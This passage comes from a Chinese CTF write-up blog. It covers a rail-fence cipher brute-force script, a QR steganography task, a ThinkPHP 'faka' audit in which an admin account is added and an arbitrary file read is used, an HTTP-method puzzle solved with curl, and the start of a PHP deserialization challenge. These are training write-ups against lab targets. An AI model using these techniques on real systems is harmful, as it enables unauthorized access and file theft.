punctuation">)</span><span class="token punctuation">:</span>        d <span class="token operator">=</span> d <span class="token operator">+</span> result<span class="token punctuation">[</span>k<span class="token punctuation">]</span>    d <span class="token operator">=</span> d<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token keyword">assert</span> <span class="token punctuation">(</span>m<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"flag"</span><span class="token punctuation">)</span>encrypt<span class="token punctuation">(</span>m<span class="token punctuation">,</span> Rail <span class="token punctuation">,</span> Offset<span class="token punctuation">)</span><span class="token comment">#reetdrvhns0eutbftafmeon&#125;linnd=a1cOh!gcedos&#123;neuwkYav0irOceytounw</span><span class="token comment">#reetdrvhns0eutbftafmeon&#125;linnd=a1cOh!gcedos&#123;neuwkYav0irOceytounw</span><span class="token comment">#flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;</span>flag <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>题目给了提示，栅栏</p><p>爆破key和offset。<code>&#123;&#125;lg</code>都是只有单个字符。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">'flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span><span class="token keyword">for</span> rails <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> offset <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        d <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>s<span class="token punctuation">,</span> rails<span class="token punctuation">,</span> offset<span class="token punctuation">)</span>        <span class="token keyword">if</span> d<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'&#125;'</span> <span class="token keyword">and</span> d<span class="token punctuation">[</span><span class="token number">42</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'&#123;'</span> <span class="token keyword">and</span> d<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'l'</span> <span class="token keyword">and</span> d<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'g'</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>rails<span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我写的爆破脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">"flag&#123;*********************************************************&#125;"</span>m <span class="token operator">=</span> <span class="token string">"reetdrvhns0eutbftafmeon&#125;linnd=a1cOh!gcedos&#123;neuwkYav0irOceytounw"</span>a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">63</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> m<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'&#123;'</span><span class="token punctuation">,</span> <span class="token string">'&#125;'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    tmp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> x <span class="token keyword">in</span> s<span class="token punctuation">:</span>            tmp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> m<span class="token punctuation">[</span>j<span class="token punctuation">]</span>        data <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>        en_data <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> en_data<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> m<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token comment"># print(m[j], i)  # 输出可能的原位置</span>            <span class="token keyword">if</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>                a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> m<span class="token punctuation">[</span>j<span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"重复："</span><span class="token punctuation">,</span> m<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我这写的思路比较麻烦，简直是倒过来爆破。先是</p><pre class="line-numbers language-none"><code class="language-none">ffffffffffb0verthefenceeveny0udOnotunderstandhowitworks!&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后把重复的f加入过滤，</p><pre class="line-numbers language-none"><code class="language-none">aaaaaaaaimb0vertheenceeveny0udOnotunderstandhowitworks!&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后再加a</p><pre class="line-numbers language-none"><code class="language-none">YOucnc1imb0vertheenceeveny0udOnotunderstndhowitworks!&#x3D;YOuc nc1imb0verthe enceeveny0udOnotunderst ndhowitworks!&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>少了f和a字符，当时脑子没转过来，还在想怎么缺了字符！！！其实光是看着英文都能补全！！气死了。浪费了好多时间。</p><p>这是多对1的，多个不同字符可能会移动到相同位置还满足条件，有可能会把正确的位置给覆盖了。</p><p>这种思路其实不太好，碰到重复字符多一点就糟了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">"flag&#123;*********************************************************&#125;"</span>m <span class="token operator">=</span> <span class="token string">"reetdrvhns0eutbftafmeon&#125;linnd=a1cOh!gcedos&#123;neuwkYav0irOceytounw"</span>a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">63</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> m<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        en_data <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> en_data<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> m<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>                a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> m<span class="token punctuation">[</span>j<span class="token punctuation">]</span>                <span class="token keyword">break</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"重复："</span><span class="token punctuation">,</span> m<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>小改了一下，很接近了。</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211024001414688.png"></p><p>在这加个</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211024001459116.png"></p><p>倒是很接近，但还不够完善。这条路本来就是崎岖了，没必要走下去了。</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211024001513778.png"></p><p>队友写的：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">compare</span><span class="token punctuation">(</span>str1<span class="token punctuation">,</span> str2<span class="token punctuation">)</span><span class="token punctuation">:</span>    ans <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> str2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>            ans <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> ansRail <span class="token operator">=</span> <span class="token number">13</span>Offset <span class="token operator">=</span> <span class="token number">5</span>m <span class="token operator">=</span> <span class="token string">'flag&#123;_________________________________________________________&#125;'</span>target <span class="token operator">=</span> <span class="token string">'reetdrvhns0eutbftafmeon&#125;linnd=a1cOh!gcedos&#123;neuwkYav0irOceytounw'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        m <span class="token operator">=</span> m<span class="token punctuation">[</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">+</span> m<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> compare<span class="token punctuation">(</span>target<span class="token punctuation">,</span> encrypt<span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以用工具一把梭。</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211023202256229.png"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="qrimg"><a href="#qrimg" class="headerlink" title="qrimg"></a>qrimg</h3><p>可用Steganography导出二维码，用脚本批量跑一下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> oscmd <span class="token operator">=</span> <span class="token string">'stegolsb stegdetect -i &#123;&#125;.bmp -n 1'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">312</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    filename <span class="token operator">=</span> <span class="token string">'./qrimg/'</span> <span class="token operator">+</span> <span class="token string">'IMG'</span> <span class="token operator">+</span> n    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>cmd<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后一个一个扫二维码……</p><p>将7次结果base64，结束。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[网鼎杯 2020 半决赛]faka</title>
      <link href="/p/2758433489.html"/>
      <url>/p/2758433489.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[faka]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-faka/image-20211024221933819.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>robots.txt有东西</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-faka/image-20211024221952908.png"></p><p>看来是thinkphp</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-faka/image-20211024224835932.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-faka/image-20211025205240666.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-faka/image-20211025205256195.png"></p><p>没啥东西</p><p>原来是给了源码的，看到四十多M的压缩包瞬间不想做了。</p><p>然后就是代码审计</p><p>seay扫一扫能给出一些思路。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-faka/image-20211026142137738.png"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;c7d9e402-ba38-4ece-9b8f-648cb97b23b8.node4.buuoj.cn:81&#x2F;admin&#x2F;index&#x2F;info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-faka/image-20211026142506432.png"></p><p>在<code>application/admin/controller/Index.php</code>中有这段</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-faka/image-20211026142427053.png"></p><p>默认session都没有，因此后面为空，get和post不传id的话，<code>$this-&gt;request-&gt;request(&#39;id&#39;)</code>也为空</p><p>一路跟下去，主要看这里，关于权限设定</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-faka/image-20211026143634965.png"></p><p>看看给的sql文件，admin的authorize是3</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-faka/image-20211026143934598.png"></p><p>加上，就把admin账户添加进去了</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-faka/image-20211026144013988.png"></p><p>成功登录</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-faka/image-20211026144135447.png"></p><p>在<code>/application/manage/controller/Backup.php</code>有任意文件读取</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-faka/image-20211026144237811.png"></p><p>测试可行</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-faka/image-20211026144415458.png"></p><p>然后读取flag，尝试/flag，没这个文件。</p><p>在这运气好的话能猜到/flag.txt,猜不到就得继续做下去。</p><p>懒得写了，就这样吧。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
            <tag> ThinkPHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[b01lers2020]Space Noodles</title>
      <link href="/p/725288439.html"/>
      <url>/p/725288439.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这题很欢乐，思维比较开阔。但对于当下而言参考价值不大。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-b01lers2020-Space-Noodles/image-20211022210716880.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>GET不行，POST才可以</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-b01lers2020-Space-Noodles/image-20211022210812703.png"></p><p>这题很难，很考验脑洞</p><p>上来先猜五个接口，得用raw。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-b01lers2020-Space-Noodles/image-20211022233829000.png"></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;circle&#x2F;one&#x2F;&#x2F;two&#x2F;&#x2F;square&#x2F;&#x2F;com&#x2F;seaerch&#x2F;&#x2F;vim&#x2F;quit&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="circle-one"><a href="#circle-one" class="headerlink" title="/circle/one/"></a>/circle/one/</h3><p>尝试万能<code>OPTIONS</code></p><blockquote><p>浏览器的预检请求，它用于获取当前URL所支持的方法。若请求成功，则它会在HTTP头中包含一个名为“Allow”的头，值是所支持的方法，如”GET, POST”</p></blockquote><p>不过测试了下没看到Allow头。</p><p>返回一个PDF，没啥用。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-b01lers2020-Space-Noodles/image-20211022234638246.png"></p><h3 id="two"><a href="#two" class="headerlink" title="/two/"></a>/two/</h3><p>PUT，返回：</p><pre class="line-numbers language-none"><code class="language-none">Put the dots???<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>CONNECT 请求会返回一个.png文件，这是真想不到。</p><pre class="line-numbers language-none"><code class="language-none">curl -X CONNECT http:&#x2F;&#x2F;7dd46417-5376-444d-92dc-0c879b824e97.node4.buuoj.cn:81&#x2F;two&#x2F; --output two.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回一张图片</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-b01lers2020-Space-Noodles/image-20211022235132798.png"></p><pre class="line-numbers language-none"><code class="language-none">up_on_noodles_<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="square"><a href="#square" class="headerlink" title="/square/"></a>/square/</h3><p>DELETE请求也有一张图片</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-b01lers2020-Space-Noodles/image-20211022235300491.png"></p><p>答案：</p><pre class="line-numbers language-none"><code class="language-none">    E    S    I    R    P  E R  C E  A TE P NTASTES L A U D U L E   A R   C A   O A N<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到文字</p><pre class="line-numbers language-none"><code class="language-none">tastes<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="com-seaerch"><a href="#com-seaerch" class="headerlink" title="/com/seaerch/"></a><strong>/com/seaerch/</strong></h3><p>GET请求</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-b01lers2020-Space-Noodles/image-20211022235436412.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-b01lers2020-Space-Noodles/image-20211022235745339.png"></p><p>返回</p><pre class="line-numbers language-none"><code class="language-none">_good_in_s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-b01lers2020-Space-Noodles/image-20211022235754647.png"></p><h3 id="vim-quit"><a href="#vim-quit" class="headerlink" title="/vim/quit/"></a><strong>/vim/quit/</strong></h3><blockquote><p>BUUCTF没法复现TRACE请求</p></blockquote><p>预期解是发送</p><pre class="line-numbers language-none"><code class="language-none">TRACE &#x2F;vim&#x2F;quit&#x2F;?exit&#x3D;:wq<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可得</p><pre class="line-numbers language-none"><code class="language-none">   &lt;hteeemel&lt;body&gt;&gt;      &lt;flag&gt; well done wait &lt;&#x2F;flag&gt;&lt;text&gt; this one&#x2F;&gt; &lt;flag&gt;pace_too&#125;&lt;&#x2F;flag&gt;&lt;&#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pace_too&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flag整合一下就是</p><pre class="line-numbers language-none"><code class="language-none">pctf&#123;ketchup_on_noodles_tastes_good_in_space_too&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[羊城杯 2020]EasySer</title>
      <link href="/p/1492341886.html"/>
      <url>/p/1492341886.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[死亡exit]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-EasySer/image-20211022155714601.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>有robots.txt</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-EasySer/image-20211022155958603.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-EasySer/image-20211022160043530.png"></p><p>尝试<code>http://127.0.0.1/ser.php</code>，爆出源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&#123;Trump_:"fake_news!"&#125;'</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">GWHT</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$hero</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hero</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Yasuo</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hero</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hero</span><span class="token operator">-></span><span class="token function">hasaki</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span 